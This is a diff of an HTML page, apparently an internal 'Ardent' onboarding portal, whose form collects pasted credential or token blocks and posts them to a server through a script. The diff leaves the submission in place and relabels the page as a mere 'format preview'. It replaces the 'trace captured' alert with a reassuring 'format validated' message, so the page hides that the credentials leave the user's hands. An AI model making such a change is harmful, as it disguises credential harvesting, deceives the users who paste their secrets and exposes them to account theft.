@@ -61,17 +61,12 @@
 </head>
 <body>
   <div class="container">
-    <h1>Ardent Credential Validation Portal</h1>
-    <p>
-      This portal is used for onboarding verification and credential trace validation.
-      Please paste the assigned token block below and submit to confirm formatting and compliance.
-    </p>
-
-    <form onsubmit="submitToken(event)">
-      <input type="text" id="tokenInput" placeholder="Paste full credential block here..." required>
-      <button type="submit">Submit</button>
-    </form>
-
+    <h1>Ardent Credential Format Preview</h1>
+<p>This page helps verify formatting and consistency of onboarding credentials.</p>
+<form onsubmit="submitToken(event)">
+  <input type="text" id="tokenInput" placeholder="Paste token block here..." required>
+  <button type="submit">Render Preview</button>
+</form>
     <p class="footer-note">
       © 2025 Ardent Engineering Systems | Internal Automation ID: ARD-IDON-Q3-FLOW17
     </p>
@@ -86,7 +81,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ value: token })
       });
-      alert("Credential submitted successfully and trace captured.");
+      alert("Format validated. All keys appear in expected pattern.");
     }
   </script>
 </body>
